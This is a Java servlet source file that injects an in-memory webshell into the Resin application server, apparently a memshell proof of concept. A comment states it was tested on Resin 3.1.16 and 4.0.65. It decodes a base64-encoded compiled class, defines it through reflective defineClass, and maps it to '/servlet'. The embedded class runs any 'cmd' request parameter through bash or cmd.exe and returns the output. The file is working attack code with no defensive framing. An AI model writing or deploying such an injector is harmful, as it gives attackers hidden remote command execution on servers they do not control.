import com.caucho.server.dispatch.ServletMapping;
import com.caucho.server.webapp.WebApp;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Method;


/**
 * 已测试：
 *  resin3.1.16
 *  resin4.0.65
 */
public class addServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            Class servletInvocation = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
            Object httpRequetst = servletInvocation.getMethod("getContextRequest").invoke(null);
            WebApp webApp = (WebApp) httpRequetst.getClass().getMethod("getWebApp").invoke(httpRequetst);
            ServletMapping servletMapping = new ServletMapping();
            byte[] evilBytes = java.util.Base64.getDecoder().decode("yv66vgAAADMAhQoAHQBCCAArCwBDAEQIAEUKAEYARwoACQBICABJCgAJAEoHAEsIAEwIAE0IAE4IAE8KAFAAUQoAUABSCgBTAFQHAFUKABEAVggAVwoAEQBYCgARAFkKABEAWggAWwsAXABdCgBeAF8KAF4AYAoAXgBhBwBiBwBjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB9MY29tL2V4YW1wbGUvcmVzaW40L2NtZFNlcnZsZXQ7AQAFZG9HZXQBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEcmVzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdpc0xpbnV4AQABWgEABW9zVHlwAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQANU3RhY2tNYXBUYWJsZQcASwcAMQcAZAcAVQEACkV4Y2VwdGlvbnMHAGUBAApTb3VyY2VGaWxlAQAPY21kU2VydmxldC5qYXZhDAAeAB8HAGYMAGcAaAEAB29zLm5hbWUHAGkMAGoAaAwAawBsAQADd2luDABtAG4BABBqYXZhL2xhbmcvU3RyaW5nAQAEYmFzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwBvDABwAHEMAHIAcwcAdAwAdQB2AQARamF2YS91dGlsL1NjYW5uZXIMAB4AdwEAAlxhDAB4AHkMAHoAewwAfABsAQAABwB9DAB+AH8HAIAMAIEAggwAgwAfDACEAB8BAB1jb20vZXhhbXBsZS9yZXNpbjQvY21kU2VydmxldAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UAIQAcAB0AAAAAAAIAAQAeAB8AAQAgAAAAMwABAAEAAAAFKrcAAbEAAAACACEAAAAKAAIAAAAPAAQAEAAiAAAADAABAAAABQAjACQAAAAEACUAJgACACAAAAGKAAQACwAAAKErEgK5AAMCAE4ENgQSBLgABToFGQXGABMZBbYABhIHtgAImQAGAzYEFQSZABgGvQAJWQMSClNZBBILU1kFLVOnABUGvQAJWQMSDFNZBBINU1kFLVM6BrgADhkGtgAPtgAQOge7ABFZGQe3ABISE7YAFDoIGQi2ABWZAAsZCLYAFqcABRIXOgksuQAYAQA6ChkKGQm2ABkZCrYAGhkKtgAbsQAAAAMAIQAAADoADgAAABMACQAUAAwAFQATABYAJQAXACgAGgBWABsAYwAcAHMAHQCHAB4AjwAfAJYAIACbACEAoAAiACIAAABwAAsAAAChACMAJAAAAAAAoQAnACgAAQAAAKEAKQAqAAIACQCYACsALAADAAwAlQAtAC4ABAATAI4ALwAsAAUAVgBLADAAMQAGAGMAPgAyADMABwBzAC4ANAA1AAgAhwAaADYALAAJAI8AEgA3ADgACgA5AAAAIQAF/gAoBwA6AQcAOhlRBwA7/gAuBwA7BwA8BwA9QQcAOgA+AAAABAABAD8AAQBAAAAAAgBB");
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class evilServlet = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(),  evilBytes, 0, evilBytes.length);
            servletMapping.setServletClass(evilServlet.getName());
            servletMapping.setServletName(evilServlet.getName());
            servletMapping.addURLPattern("/servlet");
            webApp.addServletMapping(servletMapping);
            response.getWriter().write("Servlet Injected Successfully!!!");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
